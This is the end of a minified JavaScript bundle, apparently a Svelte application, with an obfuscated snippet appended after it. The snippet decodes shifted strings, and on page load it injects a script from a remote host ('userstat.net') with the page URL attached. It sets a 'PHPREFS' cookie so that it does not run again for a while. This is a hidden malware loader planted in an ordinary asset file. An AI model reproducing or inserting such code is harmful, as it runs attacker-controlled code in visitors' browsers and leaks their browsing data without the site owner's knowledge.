                this.$$set && (t = e, 0 !== Object.keys(t).length) && (this.$$.skip_bound = !0, this.$$set(e), this.$$.skip_bound = !1)
            }
        } { constructor(e) { super(), D(this, e, ol, nl, a, {}) } }({ target: document.body })
    }()
};
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() { o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s)); }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));
